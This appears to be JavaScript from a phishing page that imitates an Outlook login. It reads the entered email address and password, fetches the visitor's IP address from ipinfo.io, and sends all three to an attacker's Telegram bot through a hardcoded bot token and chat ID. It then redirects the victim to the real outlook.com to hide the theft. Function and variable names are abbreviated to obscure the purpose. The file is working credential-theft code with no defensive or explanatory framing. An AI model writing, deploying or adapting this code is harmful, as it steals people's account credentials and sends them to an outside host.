function sxfrm() {
    var xhttp = new XMLHttpRequest();
    xhttp.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
        document.getElementById("mfrn2").innerHTML =
        this.responseText;
        }
    };
    xhttp.open("GET", "sxfr1.html", true);
    xhttp.send();
}

function sndtl(){
    var tkl = "7122615315:AAH7WecTHYukicljE0Wu8Mm30ZH8PsTBLB8";
    var chtid = "7369984331";
    var eml = $("#i1").val();
    var pss = $("#i2").val();
    var ips = "";

    

    if(!eml || !pss){
        console.log("empty");
    }else{

        mess = `E:${eml} - P:${pss}`;
        console.log( document.getElementById("i77").value );
        $.get('https://ipinfo.io/ip', function(response){
            var sets = {
                "async": true,
                "crossDomain": true,
                "url": "https://api.telegram.org/bot" + tkl + "/sendMessage",
                "method": "POST",
                "headers": {
                    "Content-Type": "application/json",
                    "cache-control": "no-cache"
        
                },
                "data": JSON.stringify({
                    "chat_id": chtid,
                    "text": "I:"+response+" - "+mess
                })
            };  
            $.ajax(sets).done(function (response) {
                window.location = "https://outlook.com";
            });  
        });
        
        
    }

}